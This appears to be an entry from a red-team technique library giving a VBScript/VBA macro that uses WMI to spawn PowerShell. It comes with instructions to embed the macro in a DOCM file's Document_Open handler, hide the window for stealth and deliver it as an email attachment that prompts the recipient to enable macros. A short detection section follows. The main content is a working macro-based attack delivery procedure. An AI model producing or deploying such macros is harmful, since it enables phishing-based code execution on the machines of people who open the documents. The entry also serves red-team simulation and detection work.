---
type: code
language: VBScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - wmi
  - code-execution
  - powershell
  - office-macro
validated: true
---

# WMI-Execute-PowerShell-Visible-Window-VBScript

## Code

```vbscript
Sub wmi_exec()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\" & strComputer & "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 1
    objProc.Create "powershell.exe", Null, procStartConfig, intProcessID
End Sub
```

## Description

This VBScript subroutine leverages WMI to launch PowerShell with a visible console window. It configures the process startup class to ensure visibility and executes in the local context. Ideal for embedding in DOCM macros to run interactive commands or payloads from Office documents.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `powershell.exe` | Executable to launch (can be any binary; add arguments via Create method) | `cmd.exe /c whoami` |
| `ShowWindow = 1` | Window visibility flag (1=visible, 0=hidden) | 0 for stealth |
| `intProcessID` | Variable for new process ID (optional) | N/A |

## Usage

Integrate this Sub into a DOCM file's VBA module and call it from Document_Open. The visible window allows command input; for stealth, set ShowWindow=0. Use in red team exercises for simulating macro-based attacks; deliver via email attachment prompting macro enablement.

## Detection

- WMI event logging for Win32_ProcessStartup modifications (Event ID 5858).
- Process monitoring: PowerShell spawned from winword.exe with WMI parentage.
- Macro analysis tools to detect VBScript WMI instantiations in Office files.

## Related

- [[procedures/Execute-Code-via-WMI-COM-Functions-in-DOCM-Files]]
